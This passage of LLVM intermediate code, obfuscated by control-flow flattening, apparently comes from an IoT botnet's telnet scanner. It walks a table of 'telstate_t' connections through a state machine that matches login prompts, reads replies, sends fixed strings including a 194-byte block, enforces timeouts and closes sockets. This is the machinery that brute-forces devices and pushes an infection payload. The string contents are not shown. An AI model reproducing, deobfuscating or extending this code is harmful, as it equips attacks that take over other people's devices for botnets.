  %1682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %1681
  %1683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1682, i32 0, i32 7
  store i16 0, i16* %1683, align 16
  %1684 = load i32, i32* %2, align 4
  %1685 = sext i32 %1684 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %1685
  %1687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1686, i32 0, i32 8
  %1688 = load i8*, i8** %1687, align 8
  %1689 = call i8* @strstr(i8* %1688, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1690 = icmp ne i8* %1689, null
  %1691 = select i1 %1690, i32 -1454046785, i32 -971196453
  store i32 %1691, i32* %switchVar
  br label %loopEnd

; <label>:1692:                                   ; preds = %loopEntry
  %1693 = load i32, i32* %2, align 4
  %1694 = sext i32 %1693 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %1694
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1695, i32 0, i32 8
  %1697 = load i8*, i8** %1696, align 8
  call void @llvm.memset.p0i8.i64(i8* %1697, i8 0, i64 1024, i32 1, i1 false)
  %1698 = load i32, i32* %2, align 4
  %1699 = sext i32 %1698 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %1699
  %1701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1700, i32 0, i32 0
  %1702 = load i32, i32* %1701, align 16
  %1703 = call i32 @sclose(i32 %1702)
  %1704 = load i32, i32* %2, align 4
  %1705 = sext i32 %1704 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %1705
  %1707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1706, i32 0, i32 2
  store i8 0, i8* %1707, align 8
  %1708 = load i32, i32* %2, align 4
  %1709 = sext i32 %1708 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %1709
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1710, i32 0, i32 3
  store i8 0, i8* %1711, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1712:                                   ; preds = %loopEntry
  %1713 = load i32, i32* %2, align 4
  %1714 = sext i32 %1713 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %1714
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1715, i32 0, i32 8
  %1717 = load i8*, i8** %1716, align 8
  %1718 = call i32 @matchPrompt(i8* %1717)
  %1719 = icmp ne i32 %1718, 0
  %1720 = select i1 %1719, i32 1930776258, i32 -771830378
  store i32 %1720, i32* %switchVar
  br label %loopEnd

; <label>:1721:                                   ; preds = %loopEntry
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 8
  %1726 = load i8*, i8** %1725, align 8
  call void @llvm.memset.p0i8.i64(i8* %1726, i8 0, i64 1024, i32 1, i1 false)
  %1727 = load i32, i32* %2, align 4
  %1728 = sext i32 %1727 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %1728
  %1730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1729, i32 0, i32 0
  %1731 = load i32, i32* %1730, align 16
  %1732 = call i32 @sclose(i32 %1731)
  %1733 = load i32, i32* %2, align 4
  %1734 = sext i32 %1733 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %1734
  %1736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1735, i32 0, i32 2
  store i8 0, i8* %1736, align 8
  %1737 = load i32, i32* %2, align 4
  %1738 = sext i32 %1737 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %1738
  %1740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1739, i32 0, i32 3
  store i8 1, i8* %1740, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1741:                                   ; preds = %loopEntry
  %1742 = load i32, i32* %2, align 4
  %1743 = sext i32 %1742 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %1743
  %1745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1744, i32 0, i32 2
  store i8 7, i8* %1745, align 8
  store i32 1620436454, i32* %switchVar
  br label %loopEnd

; <label>:1746:                                   ; preds = %loopEntry
  %1747 = load i32, i32* %2, align 4
  %1748 = sext i32 %1747 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %1748
  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1749, i32 0, i32 8
  %1751 = load i8*, i8** %1750, align 8
  call void @llvm.memset.p0i8.i64(i8* %1751, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1752:                                   ; preds = %loopEntry
  %1753 = load i32, i32* %2, align 4
  %1754 = sext i32 %1753 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %1754
  %1756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1755, i32 0, i32 0
  %1757 = load i32, i32* %1756, align 16
  %1758 = load i32, i32* %2, align 4
  %1759 = sext i32 %1758 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %1759
  %1761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1760, i32 0, i32 8
  %1762 = load i8*, i8** %1761, align 8
  %1763 = load i32, i32* %2, align 4
  %1764 = sext i32 %1763 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %1764
  %1766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1765, i32 0, i32 7
  %1767 = load i16, i16* %1766, align 16
  %1768 = zext i16 %1767 to i32
  %1769 = call i32 @readUntil(i32 %1757, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1762, i32 1024, i32 %1768)
  %1770 = icmp ne i32 %1769, 0
  %1771 = select i1 %1770, i32 -900768108, i32 1106601174
  store i32 %1771, i32* %switchVar
  br label %loopEnd

; <label>:1772:                                   ; preds = %loopEntry
  %1773 = load i32, i32* %2, align 4
  %1774 = sext i32 %1773 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %1774
  %1776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1775, i32 0, i32 6
  store i32 0, i32* %1776, align 4
  %1777 = load i32, i32* %2, align 4
  %1778 = sext i32 %1777 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %1778
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1779, i32 0, i32 7
  store i16 0, i16* %1780, align 16
  %1781 = load i32, i32* %2, align 4
  %1782 = sext i32 %1781 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %1782
  %1784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1783, i32 0, i32 8
  %1785 = load i8*, i8** %1784, align 8
  %1786 = call i8* @strstr(i8* %1785, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1787 = icmp ne i8* %1786, null
  %1788 = select i1 %1787, i32 -1373943909, i32 910456079
  store i32 %1788, i32* %switchVar
  br label %loopEnd

; <label>:1789:                                   ; preds = %loopEntry
  %1790 = load i32, i32* %2, align 4
  %1791 = sext i32 %1790 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %1791
  %1793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1792, i32 0, i32 8
  %1794 = load i8*, i8** %1793, align 8
  call void @llvm.memset.p0i8.i64(i8* %1794, i8 0, i64 1024, i32 1, i1 false)
  %1795 = load i32, i32* %2, align 4
  %1796 = sext i32 %1795 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %1796
  %1798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1797, i32 0, i32 0
  %1799 = load i32, i32* %1798, align 16
  %1800 = call i32 @sclose(i32 %1799)
  %1801 = load i32, i32* %2, align 4
  %1802 = sext i32 %1801 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %1802
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1803, i32 0, i32 2
  store i8 0, i8* %1804, align 8
  %1805 = load i32, i32* %2, align 4
  %1806 = sext i32 %1805 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %1806
  %1808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1807, i32 0, i32 3
  store i8 0, i8* %1808, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1809:                                   ; preds = %loopEntry
  %1810 = load i32, i32* %2, align 4
  %1811 = sext i32 %1810 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %1811
  %1813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1812, i32 0, i32 8
  %1814 = load i8*, i8** %1813, align 8
  %1815 = call i32 @matchPrompt(i8* %1814)
  %1816 = icmp ne i32 %1815, 0
  %1817 = select i1 %1816, i32 -1276827453, i32 280544282
  store i32 %1817, i32* %switchVar
  br label %loopEnd

; <label>:1818:                                   ; preds = %loopEntry
  %1819 = load i32, i32* %2, align 4
  %1820 = sext i32 %1819 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %1820
  %1822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1821, i32 0, i32 8
  %1823 = load i8*, i8** %1822, align 8
  call void @llvm.memset.p0i8.i64(i8* %1823, i8 0, i64 1024, i32 1, i1 false)
  %1824 = load i32, i32* %2, align 4
  %1825 = sext i32 %1824 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %1825
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1826, i32 0, i32 0
  %1828 = load i32, i32* %1827, align 16
  %1829 = call i32 @sclose(i32 %1828)
  %1830 = load i32, i32* %2, align 4
  %1831 = sext i32 %1830 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %1831
  %1833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1832, i32 0, i32 2
  store i8 0, i8* %1833, align 8
  %1834 = load i32, i32* %2, align 4
  %1835 = sext i32 %1834 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %1835
  %1837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1836, i32 0, i32 3
  store i8 1, i8* %1837, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1838:                                   ; preds = %loopEntry
  %1839 = load i32, i32* %2, align 4
  %1840 = sext i32 %1839 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %1840
  %1842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1841, i32 0, i32 2
  store i8 7, i8* %1842, align 8
  store i32 1707978123, i32* %switchVar
  br label %loopEnd

; <label>:1843:                                   ; preds = %loopEntry
  %1844 = load i32, i32* %2, align 4
  %1845 = sext i32 %1844 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %1845
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1846, i32 0, i32 8
  %1848 = load i8*, i8** %1847, align 8
  call void @llvm.memset.p0i8.i64(i8* %1848, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1849:                                   ; preds = %loopEntry
  %1850 = load i32, i32* %2, align 4
  %1851 = sext i32 %1850 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %1851
  %1853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1852, i32 0, i32 8
  %1854 = load i8*, i8** %1853, align 8
  %1855 = call i64 @strlen(i8* %1854) #10
  %1856 = trunc i64 %1855 to i16
  %1857 = load i32, i32* %2, align 4
  %1858 = sext i32 %1857 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %1858
  %1860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1859, i32 0, i32 7
  store i16 %1856, i16* %1860, align 16
  store i32 -1954627299, i32* %switchVar
  br label %loopEnd

; <label>:1861:                                   ; preds = %loopEntry
  store i32 -2025111154, i32* %switchVar
  br label %loopEnd

; <label>:1862:                                   ; preds = %loopEntry
  store i32 186157626, i32* %switchVar
  br label %loopEnd

; <label>:1863:                                   ; preds = %loopEntry
  store i32 -1019978166, i32* %switchVar
  br label %loopEnd

; <label>:1864:                                   ; preds = %loopEntry
  store i32 1492086420, i32* %switchVar
  br label %loopEnd

; <label>:1865:                                   ; preds = %loopEntry
  store i32 1665805160, i32* %switchVar
  br label %loopEnd

; <label>:1866:                                   ; preds = %loopEntry
  store i32 239129707, i32* %switchVar
  br label %loopEnd

; <label>:1867:                                   ; preds = %loopEntry
  store i32 -539856190, i32* %switchVar
  br label %loopEnd

; <label>:1868:                                   ; preds = %loopEntry
  %1869 = load i32, i32* %2, align 4
  %1870 = sext i32 %1869 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %1870
  %1872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1871, i32 0, i32 6
  %1873 = load i32, i32* %1872, align 4
  %1874 = add i32 %1873, 10
  %1875 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1876 = icmp ult i32 %1874, %1875
  %1877 = select i1 %1876, i32 2018715702, i32 -1301685264
  store i32 %1877, i32* %switchVar
  br label %loopEnd

; <label>:1878:                                   ; preds = %loopEntry
  %1879 = load i32, i32* %2, align 4
  %1880 = sext i32 %1879 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %1880
  %1882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1881, i32 0, i32 0
  %1883 = load i32, i32* %1882, align 16
  %1884 = call i32 @sclose(i32 %1883)
  %1885 = load i32, i32* %2, align 4
  %1886 = sext i32 %1885 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %1886
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1887, i32 0, i32 2
  store i8 0, i8* %1888, align 8
  %1889 = load i32, i32* %2, align 4
  %1890 = sext i32 %1889 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %1890
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1891, i32 0, i32 3
  store i8 1, i8* %1892, align 1
  store i32 -1301685264, i32* %switchVar
  br label %loopEnd

; <label>:1893:                                   ; preds = %loopEntry
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:1894:                                   ; preds = %loopEntry
  %1895 = load i32, i32* %2, align 4
  %1896 = sext i32 %1895 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %1896
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1897, i32 0, i32 0
  %1899 = load i32, i32* %1898, align 16
  %1900 = call i64 @send(i32 %1899, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %1901 = icmp slt i64 %1900, 0
  %1902 = select i1 %1901, i32 -521407509, i32 -1888341431
  store i32 %1902, i32* %switchVar
  br label %loopEnd

; <label>:1903:                                   ; preds = %loopEntry
  %1904 = load i32, i32* %2, align 4
  %1905 = sext i32 %1904 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %1905
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1906, i32 0, i32 0
  %1908 = load i32, i32* %1907, align 16
  %1909 = call i32 @sclose(i32 %1908)
  %1910 = load i32, i32* %2, align 4
  %1911 = sext i32 %1910 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %1911
  %1913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1912, i32 0, i32 2
  store i8 0, i8* %1913, align 8
  %1914 = load i32, i32* %2, align 4
  %1915 = sext i32 %1914 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %1915
  %1917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1916, i32 0, i32 3
  store i8 1, i8* %1917, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1918:                                   ; preds = %loopEntry
  %1919 = load i32, i32* %2, align 4
  %1920 = sext i32 %1919 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %1920
  %1922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1921, i32 0, i32 2
  store i8 8, i8* %1922, align 8
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:1923:                                   ; preds = %loopEntry
  %1924 = load i32, i32* %2, align 4
  %1925 = sext i32 %1924 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %1925
  %1927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1926, i32 0, i32 0
  %1928 = load i32, i32* %1927, align 16
  %1929 = call i64 @send(i32 %1928, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.43, i32 0, i32 0), i64 9, i32 16384)
  %1930 = icmp slt i64 %1929, 0
  %1931 = select i1 %1930, i32 1029105100, i32 -1693861306
  store i32 %1931, i32* %switchVar
  br label %loopEnd

; <label>:1932:                                   ; preds = %loopEntry
  %1933 = load i32, i32* %2, align 4
  %1934 = sext i32 %1933 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %1934
  %1936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1935, i32 0, i32 0
  %1937 = load i32, i32* %1936, align 16
  %1938 = call i32 @sclose(i32 %1937)
  %1939 = load i32, i32* %2, align 4
  %1940 = sext i32 %1939 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %1940
  %1942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1941, i32 0, i32 2
  store i8 0, i8* %1942, align 8
  %1943 = load i32, i32* %2, align 4
  %1944 = sext i32 %1943 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %1944
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1945, i32 0, i32 3
  store i8 1, i8* %1946, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1947:                                   ; preds = %loopEntry
  %1948 = load i32, i32* %2, align 4
  %1949 = sext i32 %1948 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %1949
  %1951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1950, i32 0, i32 2
  store i8 9, i8* %1951, align 8
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:1952:                                   ; preds = %loopEntry
  %1953 = load i32, i32* %2, align 4
  %1954 = sext i32 %1953 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %1954
  %1956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1955, i32 0, i32 6
  %1957 = load i32, i32* %1956, align 4
  %1958 = icmp eq i32 %1957, 0
  %1959 = select i1 %1958, i32 1603240557, i32 -285177349
  store i32 %1959, i32* %switchVar
  br label %loopEnd

; <label>:1960:                                   ; preds = %loopEntry
  %1961 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1962 = load i32, i32* %2, align 4
  %1963 = sext i32 %1962 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %1963
  %1965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1964, i32 0, i32 6
  store i32 %1961, i32* %1965, align 4
  store i32 -285177349, i32* %switchVar
  br label %loopEnd

; <label>:1966:                                   ; preds = %loopEntry
  %1967 = load i32, i32* %2, align 4
  %1968 = sext i32 %1967 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %1968
  %1970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1969, i32 0, i32 0
  %1971 = load i32, i32* %1970, align 16
  %1972 = call i64 @send(i32 %1971, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i32 0, i32 0), i64 194, i32 16384)
  %1973 = icmp slt i64 %1972, 0
  %1974 = select i1 %1973, i32 1597702776, i32 1257746395
  store i32 %1974, i32* %switchVar
  br label %loopEnd

; <label>:1975:                                   ; preds = %loopEntry
  %1976 = load i32, i32* %2, align 4
  %1977 = sext i32 %1976 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %1977
  %1979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1978, i32 0, i32 0
  %1980 = load i32, i32* %1979, align 16
  %1981 = call i32 @sclose(i32 %1980)
  %1982 = load i32, i32* %2, align 4
  %1983 = sext i32 %1982 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %1983
  %1985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1984, i32 0, i32 2
  store i8 0, i8* %1985, align 8
  %1986 = load i32, i32* %2, align 4
  %1987 = sext i32 %1986 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %1987
  %1989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1988, i32 0, i32 3
  store i8 1, i8* %1989, align 1
  %1990 = load i32, i32* %2, align 4
  %1991 = sext i32 %1990 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %1991
  %1993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1992, i32 0, i32 8
  %1994 = load i8*, i8** %1993, align 8
  call void @llvm.memset.p0i8.i64(i8* %1994, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1995:                                   ; preds = %loopEntry
  %1996 = load i32, i32* %2, align 4
  %1997 = sext i32 %1996 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %1997
  %1999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1998, i32 0, i32 6
  %2000 = load i32, i32* %1999, align 4
  %2001 = add i32 %2000, 10
  %2002 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2003 = icmp ult i32 %2001, %2002
  %2004 = select i1 %2003, i32 946048914, i32 -39255035
  store i32 %2004, i32* %switchVar
  br label %loopEnd

; <label>:2005:                                   ; preds = %loopEntry
  %2006 = load i32, i32* %2, align 4
  %2007 = sext i32 %2006 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %2008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %2007
  %2009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2008, i32 0, i32 0
  %2010 = load i32, i32* %2009, align 16
  %2011 = call i32 @sclose(i32 %2010)
  %2012 = load i32, i32* %2, align 4
  %2013 = sext i32 %2012 to i64
  %.reload22 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %2014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload22, i64 %2013
  %2015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2014, i32 0, i32 2
  store i8 0, i8* %2015, align 8
  %2016 = load i32, i32* %2, align 4
  %2017 = sext i32 %2016 to i64
  %.reload21 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %2018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload21, i64 %2017
  %2019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2018, i32 0, i32 3
  store i8 1, i8* %2019, align 1
  store i32 -39255035, i32* %switchVar
  br label %loopEnd

; <label>:2020:                                   ; preds = %loopEntry
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

